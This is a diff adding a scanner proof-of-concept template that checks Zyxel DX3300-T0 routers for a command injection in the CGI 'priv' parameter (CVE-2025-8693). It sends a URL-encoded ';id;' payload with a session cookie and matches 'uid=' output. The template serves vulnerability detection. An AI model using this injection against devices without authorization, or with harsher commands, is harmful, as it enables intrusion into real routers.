@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "检测 Zyxel DX3300-T0 固件 5.50(ABVY.6.3)C0 及之前版本中，CGI 程序 priv 参数是否存在 post-auth 操作系统命令注入漏洞。通过注入 id 命令并匹配 uid= 输出确认命令执行。"
+id = "POC-AVE-2025-0040"
+name = "Zyxel DX3300-T0 priv 参数命令注入 PoC"
+severity = "high"
+tags = ["ave-2025-0040"]
+vuln_id = [
+    "CVE-2025-8693",
+    "AVE-2025-0040",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/cgi-bin/"
+protocol = "http"
+
+[poc.requests.body]
+content = "priv=%3Bid%3B"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Cookie = "session={{session}}"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
